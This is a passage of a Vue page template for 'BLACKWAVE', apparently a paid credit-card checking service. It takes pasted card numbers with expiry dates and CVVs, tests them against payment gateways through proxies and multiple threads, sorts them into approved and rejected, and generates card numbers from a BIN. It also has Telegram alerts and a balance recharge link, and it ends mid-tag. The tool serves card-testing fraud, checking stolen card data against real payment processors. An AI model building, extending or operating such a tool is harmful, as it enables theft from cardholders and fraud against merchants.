<template>
    <div class="relative z-10 min-h-screen w-full md:ml-[260px] pt-[72px] md:pt-0 font-sans">
        <audio ref="audioLive" src="/audios/live.mp3" preload="auto" />
        <audio ref="audioSuccess" src="/audios/notificationSuccess.mp3" preload="auto" />
        <input ref="fileInput" type="file" accept=".txt,.csv" class="hidden" @change="onFileSelected" />

        <div class="px-5 sm:px-7 lg:px-10 py-7 max-w-6xl mx-auto flex flex-col gap-4">

            <!-- ═══ TOP STATUS BAR ════════════════════════════════ -->
            <div class="flex items-center justify-between border rounded-2xl px-5 py-3"
                style="background:#0a0a0a;border-color:rgba(255,255,255,0.07)">
                <div class="flex items-center gap-3">
                    <div class="flex items-center gap-2 px-3 py-1 rounded-full border text-[11px] font-bold uppercase tracking-widest"
                        style="background:rgba(34,197,94,0.08);border-color:rgba(34,197,94,0.2);color:#4ade80">
                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                        All systems operational
                    </div>
                    <span class="hidden sm:block text-[11px] text-white/20 font-mono">
                        BLACKWAVE → <span class="text-white/40">{{ loading ? 'RUNNING' : 'IDLE' }}</span>
                    </span>
                </div>
                <div class="flex items-center gap-3">
                    <div class="text-[11px] font-mono text-white/30 hidden sm:flex items-center gap-3">
                        <span>API <span class="text-blue-400 font-bold">{{ settings.gateway }}</span></span>
                        <span class="text-white/10">|</span>
                        <span>THREADS <span class="text-white/60 font-bold">{{ settings.threads }}×</span></span>
                        <span class="text-white/10">|</span>
                        <span>SPEED <span class="text-amber-400 font-bold">{{ lastSpeed }}</span></span>
                        <span class="text-white/10">|</span>
                        <span>PROGRESS <span class="text-white/60 font-bold">{{ tested }} / {{ loaded }}</span></span>
                    </div>
                    <!-- telegram indicator -->
                    <div v-if="telegramLinked"
                        class="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold"
                        style="background:rgba(34,158,217,0.08);border:1px solid rgba(34,158,217,0.2);color:#229ED9">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 2L11 13" />
                            <path d="M22 2L15 22 11 13 2 9l20-7z" />
                        </svg>
                        TG ON
                    </div>
                    <span
                        class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider"
                        style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);color:#60a5fa">
                        v2.0
                    </span>
                    <button @click="showConfig = true"
                        class="w-7 h-7 flex items-center justify-center rounded-lg border text-white/30 hover:text-white hover:bg-white/5 transition"
                        style="border-color:rgba(255,255,255,0.07)">
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="3" />
                            <path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14" />
                        </svg>
                    </button>
                </div>
            </div>

            <!-- ═══ INPUT DATA ════════════════════════════════════ -->
            <div class="section-block">
                <div class="section-header">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <path d="M12 20h9" />
                        <path d="M16.5 3.5a2.121 2.121 0 013 3L7 19l-4 1 1-4L16.5 3.5z" />
                    </svg>
                    INPUT DATA
                </div>

                <div class="p-5 flex flex-col gap-3">
                    <textarea v-model="cardsInput" rows="7"
                        placeholder="Paste your cards here. Format: one per line&#10;e.g. 4174014980983772|02|27|574"
                        class="w-full rounded-xl p-4 font-mono text-[13px] text-white/80 placeholder-white/20 outline-none resize-none transition"
                        style="background:#050508;border:1px solid rgba(255,255,255,0.07);line-height:1.6"
                        :class="{ 'border-blue-500/40': loading }" />

                    <!-- Drop zone -->
                    <div @click="fileInput.click()" @dragover.prevent="dragOver = true" @dragleave="dragOver = false"
                        @drop.prevent="onDrop"
                        class="rounded-xl border-2 border-dashed flex items-center justify-center gap-3 py-4 cursor-pointer transition-all"
                        :style="dragOver ? 'border-color:rgba(59,130,246,0.5);background:rgba(59,130,246,0.05)' : 'border-color:rgba(255,255,255,0.06)'"
                        :class="{ 'hover:border-white/20 hover:bg-white/[0.015]': !dragOver }">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
                            :class="dragOver ? 'text-blue-400' : 'text-white/20'">
                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" />
                            <polyline points="17 8 12 3 7 8" />
                            <line x1="12" y1="3" x2="12" y2="15" />
                        </svg>
                        <span class="text-[12px]" :class="dragOver ? 'text-blue-400' : 'text-white/20'">
                            Drag a <span class="font-mono text-white/40">.txt</span> / <span
                                class="font-mono text-white/40">.csv</span> here, or <span
                                class="underline underline-offset-2">click to select</span>
                        </span>
                    </div>

                    <!-- Action buttons -->
                    <div class="flex flex-wrap gap-2.5 items-center">
                        <button @click="startCheck" :disabled="loading || !cardsInput.trim()"
                            class="action-btn action-btn--run">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                                <polygon points="5 3 19 12 5 21 5 3" />
                            </svg>
                            Run
                        </button>
                        <button @click="pauseCheck" :disabled="!loading" class="action-btn action-btn--muted">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2.5" stroke-linecap="round">
                                <rect x="6" y="4" width="4" height="16" />
                                <rect x="14" y="4" width="4" height="16" />
                            </svg>
                            Pause
                        </button>
                        <button @click="stopCheck" :disabled="!loading" class="action-btn action-btn--stop">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2.5" stroke-linecap="round">
                                <rect x="3" y="3" width="18" height="18" rx="2" />
                            </svg>
                            Stop
                        </button>
                        <button @click="resetAll" class="action-btn action-btn--muted">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                <polyline points="1 4 1 10 7 10" />
                                <path d="M3.51 15a9 9 0 102.13-9.36L1 10" />
                            </svg>
                            Reset
                        </button>
                        <button @click="showConfig = true" class="action-btn action-btn--muted ml-auto">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="12" cy="12" r="3" />
                                <path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14" />
                            </svg>
                            Settings
                        </button>
                    </div>

                    <!-- Error banner -->
                    <transition name="fade-slide">
                        <div v-if="errorMessage" class="rounded-xl border px-4 py-3 flex items-center gap-3"
                            style="background:rgba(239,68,68,0.06);border-color:rgba(239,68,68,0.2)">
                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#f87171"
                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="12" cy="12" r="10" />
                                <line x1="12" y1="8" x2="12" y2="12" />
                                <line x1="12" y1="16" x2="12.01" y2="16" />
                            </svg>
                            <span class="text-[12px] text-red-300 flex-1">{{ errorMessage }}</span>
                            <button @click="errorMessage = ''"
                                class="text-white/20 hover:text-white/50 transition ml-auto">
                                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                    stroke-width="2" stroke-linecap="round">
                                    <line x1="18" y1="6" x2="6" y2="18" />
                                    <line x1="6" y1="6" x2="18" y2="18" />
                                </svg>
                            </button>
                        </div>
                    </transition>
                </div>
            </div>

            <!-- ═══ EXECUTION CONSOLE ════════════════════════════ -->
            <div class="section-block">
                <div class="section-header">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <polyline points="4 17 10 11 4 5" />
                        <line x1="12" y1="19" x2="20" y2="19" />
                    </svg>
                    EXECUTION
                </div>
                <div class="p-5 pt-4">
                    <div class="rounded-xl overflow-hidden border" style="border-color:rgba(255,255,255,0.07)">
                        <div class="flex items-center gap-2 px-4 py-2.5 border-b"
                            style="background:#050508;border-color:rgba(255,255,255,0.07)">
                            <span class="w-2.5 h-2.5 rounded-full" style="background:#ff5f56" />
                            <span class="w-2.5 h-2.5 rounded-full" style="background:#ffbd2e" />
                            <span class="w-2.5 h-2.5 rounded-full" style="background:#27c93f" />
                            <span class="font-mono text-[11px] text-white/20 ml-2 flex-1 text-center">BLACKWAVE — {{
                                loading ? 'RUNNING' : 'IDLE' }}</span>
                            <div class="flex items-center gap-1.5">
                                <span class="w-1.5 h-1.5 rounded-full"
                                    :class="loading ? 'bg-emerald-500 animate-pulse' : 'bg-white/20'" />
                                <span class="font-mono text-[10px]"
                                    :class="loading ? 'text-emerald-400' : 'text-white/20'">{{ loading ? 'RUNNING' :
                                    'READY' }}</span>
                            </div>
                        </div>
                        <div ref="logContainer"
                            class="font-mono text-[12px] px-4 py-3 h-52 overflow-y-auto flex flex-col gap-[3px]"
                            style="background:#020204">
                            <div v-if="consoleLogs.length === 0" class="text-white/15 py-4 text-center text-[12px]">
                                Waiting for input...</div>
                            <div v-for="(log, i) in consoleLogs" :key="i"
                                class="flex items-start gap-3 leading-relaxed">
                                <span class="text-white/20 shrink-0 text-[10px] pt-0.5 tabular-nums">{{ log.time
                                    }}</span>
                                <span class="shrink-0 font-bold text-[10px] pt-0.5 tracking-widest"
                                    :class="{ 'text-emerald-500': log.type === 'APR', 'text-red-500': log.type === 'REJ', 'text-amber-400': log.type === 'ERR', 'text-blue-400': log.type === 'SYS', 'text-white/30': log.type === 'RES', 'text-cyan-400': log.type === 'TG' }">
                                    [{{ log.type }}]</span>
                                <span class="break-all"
                                    :class="{ 'text-emerald-300/80': log.type === 'APR', 'text-red-300/60': log.type === 'REJ', 'text-amber-300/70': log.type === 'ERR', 'text-blue-300/70': log.type === 'SYS', 'text-white/40': log.type === 'RES', 'text-cyan-300/70': log.type === 'TG' }">
                                    {{ log.text }}</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ═══ SUMMARY ══════════════════════════════════════ -->
            <div class="section-block">
                <div class="section-header">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <line x1="18" y1="20" x2="18" y2="10" />
                        <line x1="12" y1="20" x2="12" y2="4" />
                        <line x1="6" y1="20" x2="6" y2="14" />
                    </svg>
                    SUMMARY
                </div>
                <div class="grid grid-cols-2 sm:grid-cols-4" style="border-top:1px solid rgba(255,255,255,0.05)">
                    <div class="summary-card">
                        <div
                            class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none text-white">
                            {{ tested }}</div>
                        <div class="summary-label text-white/30"><span class="dot bg-white/30" /> # TOTAL</div>
                    </div>
                    <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                        <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                            style="color:#4ade80">{{ approved.length }}</div>
                        <div class="summary-label" style="color:rgba(74,222,128,0.6)"><span
                                class="dot bg-emerald-500" /> APPROVED</div>
                    </div>
                    <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                        <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                            style="color:#f87171">{{ refused.length }}</div>
                        <div class="summary-label" style="color:rgba(248,113,113,0.6)"><span class="dot bg-red-500" />
                            REJECTED</div>
                    </div>
                    <div class="summary-card" style="border-left:1px solid rgba(255,255,255,0.05)">
                        <div class="font-display text-[2.2rem] font-extrabold tracking-[-0.04em] leading-none"
                            style="color:#fbbf24">{{ errors }}</div>
                        <div class="summary-label" style="color:rgba(251,191,36,0.6)"><span class="dot bg-amber-400" />
                            ERRORS</div>
                    </div>
                </div>
            </div>

            <!-- ═══ RESULTS ══════════════════════════════════════ -->
            <div class="section-block">
                <div class="section-header">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <line x1="8" y1="6" x2="21" y2="6" />
                        <line x1="8" y1="12" x2="21" y2="12" />
                        <line x1="8" y1="18" x2="21" y2="18" />
                        <line x1="3" y1="6" x2="3.01" y2="6" />
                        <line x1="3" y1="12" x2="3.01" y2="12" />
                        <line x1="3" y1="18" x2="3.01" y2="18" />
                    </svg>
                    RESULTS
                </div>
                <div class="flex items-center border-b px-5" style="border-color:rgba(255,255,255,0.07)">
                    <button v-for="tab in resultTabs" :key="tab.key" @click="activeTab = tab.key" class="result-tab"
                        :class="activeTab === tab.key ? tab.activeClass : 'text-white/25 border-transparent hover:text-white/50'">
                        <span class="w-1.5 h-1.5 rounded-full shrink-0" :class="tab.dotClass" />
                        {{ tab.label }}
                        <span class="tab-badge"
                            :style="activeTab === tab.key ? tab.badgeFg : 'background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.2)'">
                            {{ tab.key === 'approved' ? approved.length : tab.key === 'rejected' ? refused.length :
                            errors }}
                        </span>
                    </button>
                    <div class="ml-auto flex items-center gap-1">
                        <button @click="maskToggle" class="results-action-btn" :class="{ 'text-blue-400': masking }">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <rect x="3" y="11" width="18" height="11" rx="2" />
                                <path d="M7 11V7a5 5 0 0110 0v4" />
                            </svg>
                            Mask
                        </button>
                        <button @click="hideToggle" class="results-action-btn">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <path v-if="!hideResults"
                                    d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19" />
                                <line v-if="!hideResults" x1="1" y1="1" x2="23" y2="23" />
                                <path v-else d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                <circle v-if="hideResults" cx="12" cy="12" r="3" />
                            </svg>
                            {{ hideResults ? 'Show' : 'Hide' }}
                        </button>
                        <button @click="copyResults" class="results-action-btn">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <rect x="9" y="9" width="13" height="13" rx="2" />
                                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
                            </svg>
                            Copy
                        </button>
                        <button @click="exportResults" class="results-action-btn">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" />
                                <polyline points="7 10 12 15 17 10" />
                                <line x1="12" y1="15" x2="12" y2="3" />
                            </svg>
                            Export
                        </button>
                        <button @click="clearResults" class="results-action-btn results-action-btn--danger">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <polyline points="3 6 5 6 21 6" />
                                <path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a1 1 0 011-1h4a1 1 0 011 1v2" />
                            </svg>
                            Clear
                        </button>
                    </div>
                </div>
                <div v-if="!hideResults" class="min-h-[72px] px-5 py-3">
                    <div v-if="currentList.length === 0" class="py-6 text-center text-[12px] text-white/15 font-mono">No
                        entries yet.</div>
                    <transition-group name="fade-slide" tag="div" class="flex flex-col gap-0.5">
                        <div v-for="(item, idx) in currentList" :key="tab_key(item, idx)"
                            class="flex items-center gap-3 px-3 py-2 rounded-lg font-mono text-[12px] hover:bg-white/[0.02] transition-colors group">
                            <svg class="w-3 h-3 shrink-0"
                                :class="item.type === 'approved' ? 'text-emerald-500' : item.type === 'error' ? 'text-amber-400' : 'text-red-500'"
                                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
                                stroke-linecap="round" stroke-linejoin="round">
                                <polyline v-if="item.type === 'approved'" points="20 6 9 17 4 12" />
                                <template v-else>
                                    <line x1="18" y1="6" x2="6" y2="18" />
                                    <line x1="6" y1="6" x2="18" y2="18" />
                                </template>
                            </svg>
                            <span
                                :class="item.type === 'approved' ? 'text-emerald-300/80' : item.type === 'error' ? 'text-amber-300/70' : 'text-red-300/60'">
                                {{ masking ? maskCard(item.card) : item.html }}
                            </span>
                        </div>
                    </transition-group>
                </div>
                <div v-else class="py-6 text-center text-[12px] text-white/15 font-mono">Results hidden.</div>
            </div>

            <!-- ═══ GENERATOR ════════════════════════════════════ -->
            <div class="section-block">
                <div class="section-header">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <polygon
                            points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
                    </svg>
                    GENERATOR
                </div>
                <div class="p-5 flex gap-3">
                    <input v-model="genBin" placeholder="Enter BIN (e.g. 417401xxxxxxxxxx|MM|YY|CVV)"
                        class="flex-1 px-4 py-2.5 rounded-xl font-mono text-[12px] text-white/70 placeholder-white/20 outline-none transition"
                        style="background:#050508;border:1px solid rgba(255,255,255,0.07)"
                        @keyup.enter="generateCards" />
                    <button @click="generateCards"
                        class="flex items-center gap-2 px-5 py-2.5 rounded-xl text-[12px] font-bold text-white transition-all hover:-translate-y-px whitespace-nowrap"
                        style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                            stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                            <polygon
                                points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
                        </svg>
                        Generate
                    </button>
                </div>
            </div>

        </div>

        <!-- ═══ MODAL: SETTINGS ══════════════════════════════════ -->
        <transition name="modal-fade">
            <div v-if="showConfig" class="fixed inset-0 z-50 flex items-center justify-center px-4">
                <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" @click="showConfig = false" />
                <transition name="modal-zoom">
                    <div class="relative w-full max-w-xl rounded-3xl border overflow-hidden"
                        style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                        <div class="pointer-events-none absolute inset-0"
                            style="background:radial-gradient(ellipse at 50% 0%,rgba(59,130,246,0.06) 0%,transparent 55%)" />
                        <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-blue-500/40" />
                        <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-blue-500/40" />
                        <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-blue-500/40" />
                        <span class="absolute bottom-3 right-3 w-3 h-3 border-r border-b border-blue-500/40" />
                        <div class="relative flex items-center justify-between px-7 py-5 border-b"
                            style="border-color:rgba(255,255,255,0.07)">
                            <div class="flex items-center gap-3">
                                <div class="w-8 h-8 flex items-center justify-center rounded-xl border"
                                    style="background:#0a0a0a;border-color:rgba(255,255,255,0.07)">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#60a5fa"
                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <circle cx="12" cy="12" r="3" />
                                        <path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14" />
                                    </svg>
                                </div>
                                <div>
                                    <h2 class="font-display text-[1rem] font-extrabold tracking-tight text-white">
                                        Settings</h2>
                                    <p class="text-[11px] text-white/30">Configure gateway, threads and proxy.</p>
                                </div>
                            </div>
                            <button @click="showConfig = false" class="text-white/20 hover:text-white transition">
                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                    stroke-width="2" stroke-linecap="round">
                                    <line x1="18" y1="6" x2="6" y2="18" />
                                    <line x1="6" y1="6" x2="18" y2="18" />
                                </svg>
                            </button>
                        </div>
                        <div class="relative px-7 py-6 flex flex-col gap-5">
                            <!-- VALIDATION API -->
                            <div>
                                <div class="settings-section-label mb-3">
                                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <polygon
                                            points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
                                    </svg>
                                    VALIDATION API
                                </div>
                                <div class="flex flex-col gap-2">
                                    <div v-for="gw in gateways" :key="gw.id"
                                        @click="gw.online && (settings.gateway = gw.name)"
                                        class="flex items-center gap-4 px-4 py-3.5 rounded-2xl border transition-all"
                                        :class="[gw.online ? 'cursor-pointer' : 'opacity-50 cursor-not-allowed', settings.gateway === gw.name ? 'border-blue-500/30 bg-blue-500/[0.06]' : 'border-white/[0.05] bg-white/[0.01] hover:border-white/10']">
                                        <div class="w-9 h-9 flex items-center justify-center rounded-xl shrink-0 font-display font-extrabold text-[11px]"
                                            :style="settings.gateway === gw.name ? 'background:rgba(59,130,246,0.15);border:1px solid rgba(59,130,246,0.3);color:#60a5fa' : 'background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.07);color:rgba(255,255,255,0.3)'">
                                            {{ gw.abbr }}
                                        </div>
                                        <div class="flex-1 min-w-0">
                                            <div class="text-[13px] font-bold text-white leading-tight">{{ gw.name }}
                                            </div>
                                            <div class="text-[11px] text-white/30 mt-0.5">Gateway: {{ gw.gateway }} |
                                                Charge: {{
                                                gw.charge }}</div>
                                            <div class="flex flex-wrap gap-1.5 mt-2">
                                                <span v-for="tag in gw.tags" :key="tag" class="gateway-tag">{{ tag
                                                    }}</span>
                                            </div>
                                        </div>
                                        <div class="flex items-center gap-2 shrink-0">
                                            <span
                                                class="px-2 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider"
                                                :class="gw.online ? 'text-emerald-400' : 'text-red-400'"
                                                :style="gw.online ? 'background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.25)' : 'background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25)'">
                                                {{ gw.online ? 'ONLINE' : 'OFFLINE' }}
                                            </span>
                                            <svg v-if="settings.gateway === gw.name" width="14" height="14"
                                                viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5"
                                                stroke-linecap="round">
                                                <polyline points="20 6 9 17 4 12" />
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- THREADS -->
                            <div>
                                <div class="settings-section-label mb-3">
                                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                        stroke-width="2" stroke-linecap="round">
                                        <line x1="4" y1="6" x2="20" y2="6" />
                                        <line x1="4" y1="12" x2="14" y2="12" />
                                        <line x1="4" y1="18" x2="18" y2="18" />
                                    </svg>
                                    THREADS
                                </div>
                                <div class="px-4 py-4 rounded-2xl border flex items-center gap-5"
                                    style="background:rgba(255,255,255,0.02);border-color:rgba(255,255,255,0.06)">
                                    <div class="w-9 h-9 flex items-center justify-center rounded-xl border shrink-0"
                                        style="background:rgba(59,130,246,0.1);border-color:rgba(59,130,246,0.25)">
                                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#60a5fa"
                                            stroke-width="2" stroke-linecap="round">
                                            <line x1="4" y1="6" x2="20" y2="6" />
                                            <line x1="4" y1="12" x2="14" y2="12" />
                                            <line x1="4" y1="18" x2="18" y2="18" />
                                        </svg>
                                    </div>
                                    <div class="flex-1">
                                        <div class="text-[13px] font-bold text-white">Threads</div>
                                        <div class="text-[11px] text-white/30 mb-2">{{ settings.threads }} concurrent
                                            requests
                                        </div>
                                        <div class="flex gap-1.5">
                                            <button v-for="n in [1, 2, 4]" :key="n" @click="settings.threads = n"
                                                class="w-8 h-7 flex items-center justify-center rounded-lg text-[11px] font-bold transition-all"
                                                :class="settings.threads === n ? 'bg-blue-600 text-white' : 'text-white/30 border border-white/[0.07] hover:border-white/15 hover:text-white/60'">
                                                ×{{ n }}
                                            </button>
                                        </div>
                                    </div>
                                    <div class="flex items-center gap-2 shrink-0">
                                        <button @click="settings.threads = Math.max(1, settings.threads - 1)"
                                            class="w-7 h-7 flex items-center justify-center rounded-lg border text-white/40 hover:text-white hover:bg-white/5 transition"
                                            style="border-color:rgba(255,255,255,0.1)">
                                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
                                                <line x1="5" y1="12" x2="19" y2="12" />
                                            </svg>
                                        </button>
                                        <span
                                            class="font-display text-[1.4rem] font-extrabold text-white w-8 text-center tabular-nums">{{
                                            settings.threads }}</span>
                                        <button @click="settings.threads = Math.min(4, settings.threads + 1)"
                                            class="w-7 h-7 flex items-center justify-center rounded-lg border text-white/40 hover:text-white hover:bg-white/5 transition"
                                            style="border-color:rgba(255,255,255,0.1)">
                                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
                                                <line x1="12" y1="5" x2="12" y2="19" />
                                                <line x1="5" y1="12" x2="19" y2="12" />
                                            </svg>
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <!-- PROXY -->
                            <div>
                                <label
                                    class="block text-[10px] font-semibold uppercase tracking-widest text-white/30 mb-2">Proxy</label>
                                <input v-model="settings.proxy" placeholder="proxy.host.com:31112:username:password"
                                    class="w-full px-4 py-2.5 rounded-xl font-mono text-[12px] text-white/60 placeholder-white/15 outline-none transition"
                                    style="background:#050508;border:1px solid rgba(255,255,255,0.07)" />
                                <p class="mt-1.5 text-[11px] text-white/20">Proxy used by gateway requests.</p>
                            </div>
                            <!-- BUTTONS -->
                            <div class="flex gap-2.5 pt-1">
                                <button @click="resetSettings"
                                    class="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl border text-[12px] font-bold text-white/40 hover:text-white hover:bg-white/5 transition"
                                    style="border-color:rgba(255,255,255,0.07)">
                                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                        stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                        <polyline points="1 4 1 10 7 10" />
                                        <path d="M3.51 15a9 9 0 102.13-9.36L1 10" />
                                    </svg>
                                    Reset
                                </button>
                                <button @click="saveSettings"
                                    class="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl text-[12px] font-bold text-white transition-all hover:-translate-y-px"
                                    style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">
                                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                        stroke-width="2.5" stroke-linecap="round">
                                        <polyline points="20 6 9 17 4 12" />
                                    </svg>
                                    Save
                                </button>
                            </div>
                        </div>
                    </div>
                </transition>
            </div>
        </transition>

        <!-- ═══ MODAL: NO BALANCE ════════════════════════════════ -->
        <transition name="modal-fade">
            <div v-if="showNoBalanceModal" class="fixed inset-0 z-50 flex items-center justify-center px-4">
                <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" @click="showNoBalanceModal = false" />
                <transition name="modal-zoom">
                    <div class="relative w-full max-w-sm rounded-3xl border p-8 flex flex-col items-center gap-5 overflow-hidden text-center"
                        style="background:#020208;border-color:rgba(255,255,255,0.1);box-shadow:0 24px 80px rgba(0,0,0,0.7)">
                        <div class="pointer-events-none absolute inset-0"
                            style="background:radial-gradient(ellipse at 50% 0%,rgba(239,68,68,0.06) 0%,transparent 55%)" />
                        <span class="absolute top-3 left-3 w-3 h-3 border-l border-t border-red-500/30" />
                        <span class="absolute top-3 right-3 w-3 h-3 border-r border-t border-red-500/30" />
                        <span class="absolute bottom-3 left-3 w-3 h-3 border-l border-b border-red-500/30" />
                        <span class="absolute bottom-3 right-3 w-3 h-3 border-r border-b border-red-500/30" />
                        <button @click="showNoBalanceModal = false"
                            class="absolute top-4 right-4 text-white/20 hover:text-white transition">
                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                stroke-width="2" stroke-linecap="round">
                                <line x1="18" y1="6" x2="6" y2="18" />
                                <line x1="6" y1="6" x2="18" y2="18" />
                            </svg>
                        </button>
                        <div class="relative w-12 h-12 flex items-center justify-center rounded-2xl border"
                            style="background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.2)">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f87171"
                                stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                <circle cx="12" cy="12" r="10" />
                                <line x1="12" y1="8" x2="12" y2="12" />
                                <line x1="12" y1="16" x2="12.01" y2="16" />
                            </svg>
                        </div>
                        <div class="relative">
                            <h2 class="font-display text-[1.2rem] font-extrabold tracking-tight text-white mb-2">
                                Insufficient
                                Balance</h2>
                            <p class="text-[13px] text-white/40 leading-relaxed">You need at least <span
                                    class="text-red-400 font-bold">R$ 0.10</span> to start.</p>
                        </div>
                        <a href="https://t.me/yuzuuk1" target="_blank" rel="noopener" class="relative w-full">
                            <button @click="showNoBalanceModal = false"
                                class="w-full flex items-center justify-center gap-2 py-3 rounded-xl text-[13px] font-bold text-white transition-all hover:-translate-y-px"
                                style="background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25)">Recharge
